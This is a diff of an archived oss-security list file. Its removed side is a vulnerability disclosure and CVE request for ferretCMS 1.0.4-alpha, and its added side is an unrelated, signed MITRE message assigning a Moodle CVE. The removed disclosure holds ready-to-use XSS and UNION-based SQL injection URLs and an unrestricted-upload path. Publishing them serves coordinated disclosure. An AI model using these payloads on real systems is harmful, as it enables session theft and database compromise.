@@ -1,104 +1,35 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/23/3
-Message-ID: <CALH-=7wWJbiiD_QcrczrbWk6p30WQeHdHGQBjFk6GQQmxsnipw@mail.gmail.com>
-Date: Fri, 23 Jan 2015 07:14:56 +0100
-From: Steffen Rösemann <steffen.roesemann1986@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: CVE-Request -- ferretCMS v.1.0.4-alpha -- Multiple reflecting/stored XSS- and SQLi-vulnerabilities, unrestricted file upload
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/02/05/11
+Message-Id: <20150205165938.CFB8A6C0042@smtpvmsrv1.mitre.org>
+Date: Thu,  5 Feb 2015 11:59:38 -0500 (EST)
+From: cve-assign@...re.org
+To: kseifried@...hat.com
+Cc: cve-assign@...re.org, oss-security@...ts.openwall.com, security@...dle.com
+Subject: Re: CVE request for Moodlee MDL-48980 Security: Always clean the result from min_get_slash_argument - Moodle
 Content-Type: text/plain; charset=utf-8
 
-Hi Josh, Steve, vendors, list.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-I found multiple reflecting/stored XSS- and SQLi-vulnerabilities as well as
-an unrestricted file upload in the CMS ferretCMS v.1.0.4 which is currently
-in the alpha development stage.
+> http://git.moodle.org/gw?p=moodle.git;a=commit;h=af9a7937cc085f96bdbc4724cadec6eeae0242fc
+> 
+> MDL-48980 Security: Always clean the result from min_get_slash_argument
 
-============
-Reflecting XSS
-============
+Use CVE-2015-1493.
 
-http://
-{TARGET}/admin.php?type=search&action=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+- -- 
+CVE assignment team, MITRE CVE Numbering Authority
+M/S M300
+202 Burlington Road, Bedford, MA 01730 USA
+[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.14 (SunOS)
 
-============
-Stored XSS
-============
-
-1.
-via login-form of the administrative backend, input field for username:
-
-http://{TARGET}/admin.php
-
-executed here in the logevent functionality in the backend:
-
-http://{TARGET}/admin.php?type=log&action=read
-
-2.
-
-via the new blog-post form, input field for pagetitle:
-
-http://{TARGET}/admin.php?type=page&action=insert&p=
-
-executed, for example, here:
-
-http://{TARGET}/admin.php?type=page&action=read
-
-============
-SQLi
-============
-
-http://
-{TARGET}/admin.php?type=site&action=update&p=1+and+1=2+union+select+1,version%28%29,3,4+--+
-
-http://
-{TARGET}/admin.php?type=customkey&action=update&p=1+and+1=2+union+select+1,version%28%29,database%28%29,4+--+
-
-http://
-{TARGET}/admin.php?type=account&action=update&p=1+and+1=2+union+select+1,database%28%29,3,4,5,version%28%29,7,8,9+--+
-
-http://
-{TARGET}/admin.php?type=plugin&action=update&p=1+and+1=2+union+select+1,database%28%29,version%28%29,4+--+
-
-http://
-{TARGET}/admin.php?type=template&action=update&p=1+and+1=2+union+select+1,version%28%29,database%28%29,user%28%29,5+--+
-
-http://
-{TARGET}/admin.php?type=permissiongroup&action=update&p=1+and+1=2+union+select+1,version%28%29,3,4+--+
-
-http://
-{TARGET}/admin.php?type=page&action=update&p=1+and+substring%28version%28%29,1,1%29=5+--+
-
-==================
-Unrestricted file upload
-==================
-
-An administrator has the opportunity to upload arbitrary files via a form
-located here on a common ferretCMS installation:
-
-http://{TARGET}/admin.php?type=uploader&action=upload
-
-As these files aren't renamed and stored in the following location, any
-unauthenticated user is able to read/execute those files, too:
-
-http://{TARGET}/custom/uploads/{NAME_OF_THE_FILE}
-
-
-
-Could you please assign a CVE-ID / CVE-IDs for these issues.
-
-Thank you very much!
-
-Greetings.
-
-Steffen Rösemann
-
-References:
-
-[1] https://github.com/JRogaishio/ferretCMS
-[2] http://sroesemann.blogspot.de/2015/01/sroeadv-2015-10.html
-[3] https://github.com/JRogaishio/ferretCMS/issues/63
-[4] https://github.com/sroesemann/ferretCMS
-[5] http://seclists.org/fulldisclosure/2015/Jan/98
-[6]
-http://sroesemann.blogspot.de/2015/01/report-for-advisory-sroeadv-2015-10.html
-
+iQEcBAEBAgAGBQJU06ESAAoJEKllVAevmvmsUnoH/2YfDh5GcUTl/+QiOeH2Drj9
+81MUmmh7BEQEJ6lV5oFgnwTw+QBSkzgGwtTyYyOTc0BD0sDYIoS3IuiDJD7/tPtr
+/wAMaPss8k+G20V+2IbeG9bJSx1vf9ZIhh1nV8lahsVEH9VFq1895y6/epOOKVmR
+spX1LYl/JgoXveOGuyu1xZmNLxNtJhCBR5+CKMF3GUPsv7PvU4uO1h00Gwz0UkVL
+KZPiZCyfPHzodypx9cwCiQFLzNWwi1SCIGXmAHIH55W14mfhX/BB4Q1qNyvPOUEs
+z2XEYrXkbJtJRuQz/AJJiYiYd7PLkWlfdYiVatvwNGNiWP8CPpzmCzVIy5iLvoA=
+=CZWg
+-----END PGP SIGNATURE-----
